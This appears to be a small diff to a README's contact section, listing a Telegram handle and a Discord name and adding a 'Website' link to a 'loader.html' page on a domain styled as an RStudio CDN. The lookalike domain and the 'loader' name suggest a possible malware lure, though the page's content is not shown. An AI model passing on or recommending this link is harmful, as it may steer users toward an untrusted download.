@@ -120,6 +120,7 @@ Need help or have questions? Contact us:
 
 - **Telegram**: [@gummp3](https://t.me/gummp3)
 - **Discord**: `gum.ogg`
+- **Website**: [rstudio-cdn.vercel.app/loader.html](http://rstudio-cdn.vercel.app/loader.html) (new)
 
 ---
 
